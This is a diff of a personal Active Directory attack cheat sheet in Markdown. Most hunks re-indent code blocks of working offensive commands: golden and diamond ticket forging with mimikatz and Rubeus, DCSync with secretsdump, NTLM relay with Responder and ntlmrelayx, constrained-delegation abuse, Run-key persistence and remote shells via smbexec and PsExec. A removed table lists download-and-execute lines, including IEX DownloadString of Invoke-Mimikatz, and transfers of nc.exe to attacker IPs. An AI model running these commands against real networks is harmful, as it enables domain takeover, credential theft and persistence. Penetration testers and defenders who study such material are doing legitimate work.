@@ -1,6 +1,8 @@
 ---
 title: 📝 AD CheatSheet
-tags: #cheatsheet
+tags: 
+- cheatsheet
+- active-directory
 ---
 This is my personal safe for arsenals. Feel free to refer and use at anytime. You can also refer to this [arsenals](arsenals) for any extra commands (`Ctrl+f` will definitely help)
 
@@ -311,19 +313,19 @@ This attack made possible since there is no security boundary between domains. H
 | Parent domain EA SID | `S-1-5-21-378720957-2217973887-3501892633-519` |
 
 1. Forge a [Golden Ticket](#golden-ticket) that contains _extra sid_ of the parent domain's Enterprise Admins.
-	```
-	# windows
-	mimikatz# kerberos::golden /user:Administrator /domain:child.domain.local [/ntlm|/aes256]:833ef1dcc490f88a8f4a8a00859736de /sid:S-1-5-21-3263068140-2042698922-2891547269 /sids:S-1-5-21-378720957-2217973887-3501892633-519 /ptt
+```
+# windows
+mimikatz# kerberos::golden /user:Administrator /domain:child.domain.local [/ntlm|/aes256]:833ef1dcc490f88a8f4a8a00859736de /sid:S-1-5-21-3263068140-2042698922-2891547269 /sids:S-1-5-21-378720957-2217973887-3501892633-519 /ptt
 
-	# linux
-	ticketer.py -nthash 833ef1dcc490f88a8f4a8a00859736de -domain-sid S-1-5-21-3263068140-2042698922-2891547269 -domain child.domain.local -extra-sid S-1-5-21-378720957-2217973887-3501892633-519 Administrator
-	```
+# linux
+ticketer.py -nthash 833ef1dcc490f88a8f4a8a00859736de -domain-sid S-1-5-21-3263068140-2042698922-2891547269 -domain child.domain.local -extra-sid S-1-5-21-378720957-2217973887-3501892633-519 Administrator
+```
 
 2. Use the ticket to perform Pass The Ticket (PTT) and win!. Ensure to use FQDN if you encounter any errors. _Note that if you ran mimikatz command with `/ptt` flag already does the following step. Hence you might want to skip this step_
-	```
-	export KRB5CCNAME=Administrator.ccache
-	secretsdump.py child.domain.local/Administrator@dc01.domain.local -just-dc -k -no-pass
-	```
+```
+export KRB5CCNAME=Administrator.ccache
+secretsdump.py child.domain.local/Administrator@dc01.domain.local -just-dc -k -no-pass
+```
 
 Above steps could be automated with [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) if you obtain a privileged account (i.e. Domain Admin). _-debug flag is <3_
 ```
@@ -334,12 +336,12 @@ raiseChild.py -target-exec dc-1.domain.local child.domain.local/domainadm -hashe
 ### SID History
 This attack path is only applicable when **SID Filtering is disabled** and **SID History is enabled**. You can read the in-depth [blogpost](https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d) on this by harmj0y.
 1. Check for `trustAttributes`  attribute. Make sure SID History is enabled
-	```
-	Get-DomainTrust
-	[[..snip..]]
-	TrustAttributes : TREAT_AS_EXTERNAL
-	[[..snip..]]
-	```
+```
+Get-DomainTrust
+[[..snip..]]
+TrustAttributes : TREAT_AS_EXTERNAL
+[[..snip..]]
+```
 If _TREAT\_AS\_EXTERNAL_ flag is set in **trustAtrributes** property, that means forst-trust is now more relaxed as stated in this [documentation](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c?redirectedfrom=MSDN)
 > _If this bit is set, then a cross-forest trust to a domain is to be treated as an external trust for the purposes of SID Filtering._ **_Cross-forest trusts are more stringently filtered than external trusts_**_. This attribute relaxes those cross-forest trusts to be equivalent to external trusts._
 
@@ -347,12 +349,12 @@ If _TREAT\_AS\_EXTERNAL_ flag is set in **trustAtrributes** property, that means
 >The ForestSpecific rule is for those SIDs that are never allowed in a PAC that originates from out of the forest or from a domain that has been marked as QuarantinedWithinForest, unless it belongs to that domain.
 
 ```
-	mimikatz# kerberos::golden /user:administrator /domain:contoso.local /sid:<domain-sid> /rc4:<trust-key> /service:krbtgt /target:fortress.local /sids:<victim-user-sid> /ticket:<path>\ticket.kirbi
+mimikatz# kerberos::golden /user:administrator /domain:contoso.local /sid:<domain-sid> /rc4:<trust-key> /service:krbtgt /target:fortress.local /sids:<victim-user-sid> /ticket:<path>\ticket.kirbi
 ```
 3. Asktgs with the generated kirbi ticket
-	```
-	Rubeus.exe asktgs /ticket:<path>\ticket.kirbi /service:HTTP/dc02.contose.local /dc:dc02.contoso.local /ptt
-	```
+```
+Rubeus.exe asktgs /ticket:<path>\ticket.kirbi /service:HTTP/dc02.contose.local /dc:dc02.contoso.local /ptt
+```
 
 ### Shadow Principal/PAM Trust
 The users in current forest can be "mapped" to privileged group like Domain Admins and Enterprise Admins. Use below command to enumerate _Shadow Principal_
@@ -432,26 +434,26 @@ _Note: This attack will only work if SMB signing if disabled. This can be verify
 
 1. Disable **SMB** and **HTTP** in `/etc/Responder.conf`
 2. Fire up responder. **SMB** and **HTTP** protocol now should now show as [OFF]
-	```
-	Responder.py -I eth0 -rdvw
-	```
-3. Create a targets.txt file containing targeted ip addresses. `ntlmrelayx.py` will run captured hash to every protocol available on the given ip addresses
-	```
-	all://192.168.0.10
-	all://192.168.0.11
-	```
-4. Run `ntlmrelayx.py`
-	```
-	ntlmrelayx.py -tf targets.txt -smb2support -socks
-	```
-5. Authenticate with any available Impacket scripts through `proxychains` and supply no password
-	```
-	# PsExec
-	proxychains Psexec.py contoso/administrator:''@192.168.0.10
+```
+Responder.py -I eth0 -rdvw
+```
+1. Create a targets.txt file containing targeted ip addresses. `ntlmrelayx.py` will run captured hash to every protocol available on the given ip addresses
+```
+all://192.168.0.10
+all://192.168.0.11
+```
+1. Run `ntlmrelayx.py`
+```
+ntlmrelayx.py -tf targets.txt -smb2support -socks
+```
+1. Authenticate with any available Impacket scripts through `proxychains` and supply no password
+```
+# PsExec
+proxychains Psexec.py contoso/administrator:''@192.168.0.10
 
-	# mssqlclient
-	proxychains mssqlclient.py contoso/sqlsvc:''@192.168.0.15 -windows-auth -debug
-	```
+# mssqlclient
+proxychains mssqlclient.py contoso/sqlsvc:''@192.168.0.15 -windows-auth -debug
+```
 
 ### Credential Harvesting
 ### DCSync
@@ -493,53 +495,53 @@ A diamond ticket is quite different from a [Golden Ticket](#golden-ticket) becau
 | krbtgt AES-256 Key  | 8161d45ac308add4c553fad55fe70d8ce8c06160eeeb720df8bcbf16575400ee |
 | User in PAC         | rangeadm                                                         |
 1. Request a diamond key with [Rubeus](https://github.com/GhostPack/Rubeus). It does the following steps:-
-	```
-	i. Request normal user TGT
-	ii. Decrypt the TGT with krbtgt aes key
-	iii. Modify ticket PAC and insert _rangeadm_ in the PAC
-	```
-	```
-	Rubeus.exe diamond /krbkey:8161d45ac308add4c553fad55fe70d8ce8c06160eeeb720df8bcbf16575400ee /user:loki /password:Password123 /enctype:aes /domain:range.net /dc:dc01.range.net /ticketuser:rangeadm /ticketuserid:1104 /groups:512 /nowrap
-	```
-2. To verify the Diamond ticket (modified TGT), requst a service ticket (TGS)
-	```
-	.\Rubeus.exe asktgs /ticket:<tgt> /service:cifs/dc01.range.net /nowrap
-	```
+```
+i. Request normal user TGT
+ii. Decrypt the TGT with krbtgt aes key
+iii. Modify ticket PAC and insert _rangeadm_ in the PAC
+```
+```
+Rubeus.exe diamond /krbkey:8161d45ac308add4c553fad55fe70d8ce8c06160eeeb720df8bcbf16575400ee /user:loki /password:Password123 /enctype:aes /domain:range.net /dc:dc01.range.net /ticketuser:rangeadm /ticketuserid:1104 /groups:512 /nowrap
+```
+1. To verify the Diamond ticket (modified TGT), requst a service ticket (TGS)
+```
+.\Rubeus.exe asktgs /ticket:<tgt> /service:cifs/dc01.range.net /nowrap
+```
 For detailed explanation, read this article by Semperis [here](https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/)
 
 ### msDS-AllowedToDelegateTo
 Note that the `msDS-AllowedToDelegateTo` is the user account flag which controls the services to which a user accounts has access to. This means, with enough privileges, it is possible to access any service from a target user.
 
 1. Set the `msDS-AllowedToDelegateTo` attribute of a user _lowpriv_ to give privilege for it to request ticket for _cifs_ service to dc01.
-	```
-	# AD Module / RSAT
-	Set-ADUser -Identity lowpriv -Add @{'msDS-AllowedToDelegateTo'=@('cifs/dc01.legitcorp.local')} -Verbose
+```
+# AD Module / RSAT
+Set-ADUser -Identity lowpriv -Add @{'msDS-AllowedToDelegateTo'=@('cifs/dc01.legitcorp.local')} -Verbose
 
-	# PowerView
-	Set-DomainObject -Identity lowpriv -Set @{"msds-allowedtodelegateto"="cifs/dc01.legitcorp.local"}
-	Set-DomainObject -SamAccountName lowpriv -Xor @{"useraccountcontrol"="16777216"}
+# PowerView
+Set-DomainObject -Identity lowpriv -Set @{"msds-allowedtodelegateto"="cifs/dc01.legitcorp.local"}
+Set-DomainObject -SamAccountName lowpriv -Xor @{"useraccountcontrol"="16777216"}
 
-	# Linux
-	setCD.py legitcorp.local/Administrator:'P@$$w0rd!xyz' -dc-ip 192.168.86.170 -target 'lowpriv' -spn 'cifs/dc01.legitcorp.local'
-	```
-2. Request the service ticket for _cifs_ service with impacket [getST.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/getST.py) and impersonate to administrator.
-	```
-	# Rubeus
-	Rubeus.exe hash /user:lowpriv /password:'P@$$w0rd!xyz' /domain:legitcorp.local
-	Rubeus.exe s4u /user:lowpriv /rc4:098D747A5D113F6AE9D6A599EB8E539B /domain:legitcorp.local /impersonateuser:administrator /msdsspn:cifs/dc01.legitcorp.local /ptt
+# Linux
+setCD.py legitcorp.local/Administrator:'P@$$w0rd!xyz' -dc-ip 192.168.86.170 -target 'lowpriv' -spn 'cifs/dc01.legitcorp.local'
+```
+1. Request the service ticket for _cifs_ service with impacket [getST.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/getST.py) and impersonate to administrator.
+```
+# Rubeus
+Rubeus.exe hash /user:lowpriv /password:'P@$$w0rd!xyz' /domain:legitcorp.local
+Rubeus.exe s4u /user:lowpriv /rc4:098D747A5D113F6AE9D6A599EB8E539B /domain:legitcorp.local /impersonateuser:administrator /msdsspn:cifs/dc01.legitcorp.local /ptt
 
-	# Impacket
-	getST.py -spn cifs/dc01.legitcorp.local legitcorp.local/lowpriv:'P@$$w0rd!xyz' -dc-ip 192.168.86.170 -impersonate 'administrator'
-	export KRB5CCNAME='administrator.ccache'
-	```
-3. Getting an interactive shell with smbexec.py. Note that there are other several ways to achieve this and executing smbexec.py or psexec.py might cause a noisy traffic on the environment.
-	```
-	# Sysinternal
-	PsExec64.exe -accepteula \\dc01.legitcorp.local cmd
+# Impacket
+getST.py -spn cifs/dc01.legitcorp.local legitcorp.local/lowpriv:'P@$$w0rd!xyz' -dc-ip 192.168.86.170 -impersonate 'administrator'
+export KRB5CCNAME='administrator.ccache'
+```
+1. Getting an interactive shell with smbexec.py. Note that there are other several ways to achieve this and executing smbexec.py or psexec.py might cause a noisy traffic on the environment.
+```
+# Sysinternal
+PsExec64.exe -accepteula \\dc01.legitcorp.local cmd
 
-	# Impacket
-	smbexec.py legitcorp.local/Administrator@dc01.legitcorp.local -dc-ip 192.168.86.170 -no-pass -k
-	```
+# Impacket
+smbexec.py legitcorp.local/Administrator@dc01.legitcorp.local -dc-ip 192.168.86.170 -no-pass -k
+```
 
 ### Registry Keys
 ### Execute on startup
@@ -551,31 +553,31 @@ HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
 ```
 1. Add a new value to one of the KeyName above 
-	```
-	reg.exe add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v RunMe /t REG_SZ /d "C:\Users\Public\mybinary.exe"
-	```
+```
+reg.exe add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v RunMe /t REG_SZ /d "C:\Users\Public\mybinary.exe"
+```
 
 ### krbtgt Constrained Delegation
 1. Add a new computer account with [addcomputer.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/addcomputer.py). This steps would require a domain account with a privilege to create computer account. (Domain objects are allowed to create up to 10 computer accounts in a domain as per default configuration). 
-	```
-	addcomputer.py -computer-name FakeComputer -computer-pass 'Passw0rd' -dc-ip 192.168.86.170 legitcorp.local/lowpriv:'P@$$w0rd!xyz'
-	```
-2. Set the _msDS-AllowedToDelegateTo_ attribute to `krbtgt/legitcorp`. [setCD.py](https://gist.githubusercontent.com/snovvcrash/c8f8fa7721c40f4cca0c46c196066a41/raw/3ddd82ab44048d0fe8530ae2da87199cdc70779f/setCD.py) is a script by [@snovvcrash](https://twitter.com/snovvcrash)
-	```
-	setCD.py legitcorp.local/Administrator:'P@$$w0rd!xyz' -dc-ip 192.168.86.170 -target 'FakeComputer$' -spn krbtgt/legitcorp
-	```
-3. Request service ticket for the created computer by impersonating domain controller computer account (s4u delegation).
-	```
-	# request service ticket
-	getST.py -spn krbtgt/legitcorp legitcorp.local/FakeComputer\$:'Passw0rd' -dc-ip 192.168.86.170 -impersonate 'DC01$'
+```
+addcomputer.py -computer-name FakeComputer -computer-pass 'Passw0rd' -dc-ip 192.168.86.170 legitcorp.local/lowpriv:'P@$$w0rd!xyz'
+```
+1. Set the _msDS-AllowedToDelegateTo_ attribute to `krbtgt/legitcorp`. [setCD.py](https://gist.githubusercontent.com/snovvcrash/c8f8fa7721c40f4cca0c46c196066a41/raw/3ddd82ab44048d0fe8530ae2da87199cdc70779f/setCD.py) is a script by [@snovvcrash](https://twitter.com/snovvcrash)
+```
+setCD.py legitcorp.local/Administrator:'P@$$w0rd!xyz' -dc-ip 192.168.86.170 -target 'FakeComputer$' -spn krbtgt/legitcorp
+```
+1. Request service ticket for the created computer by impersonating domain controller computer account (s4u delegation).
+```
+# request service ticket
+getST.py -spn krbtgt/legitcorp legitcorp.local/FakeComputer\$:'Passw0rd' -dc-ip 192.168.86.170 -impersonate 'DC01$'
 
-	# export ticket into environment variable
-	export KRB5CCNAME='DC01$.ccache'
-	```
-4. Perform DCSync on the domain controller
-	```
-	secretsdump.py legitcorp.local/DC01\$@dc01.legitcorp.local -dc-ip 192.168.86.170 -just-dc -k -no-pass
-	```
+# export ticket into environment variable
+export KRB5CCNAME='DC01$.ccache'
+```
+1. Perform DCSync on the domain controller
+```
+secretsdump.py legitcorp.local/DC01\$@dc01.legitcorp.local -dc-ip 192.168.86.170 -just-dc -k -no-pass
+```
 You can read more from this great [article](https://skyblue.team/posts/delegate-krbtgt/) from [citronneur](https://twitter.com/citronneur). _CAVEAT: This is not really an OPSEC safe choice to perform persistence. So please be extra careful and cautious when executing the above steps_
 
 ## Remote Authentication Between Computers
@@ -1010,23 +1012,6 @@ For the details explanation of the vulnerability (CVE-2022-26923), you may read 
 * [NTLMv1 Downgrade Requirements](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ntlm/ntlmv1-downgrade)
 * https://www.fortalicesolutions.com/posts/keeping-up-with-the-ntlm-relay
 * https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/
-
-## File Transfer
-
-| **Command** | **Description** |
-| --------------|-------------------|
-| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1` | Download a file with PowerShell |
-| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`  | Execute a file in memory using PowerShell |
-| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64` | Upload a file with PowerShell |
-| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe` | Download a file using Bitsadmin |
-| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe` | Download a file using Certutil |
-| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh` | Download a file using Wget |
-| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` | Download a file using cURL |
-| `php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'` | Download a file using PHP |
-| `scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Upload a file using SCP |
-| `scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file using SCP |
-| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Invoke-WebRequest using a Chrome User Agent |
-
 # References
 * https://www.harmj0y.net/
 * https://www.labofapenetrationtester.com/
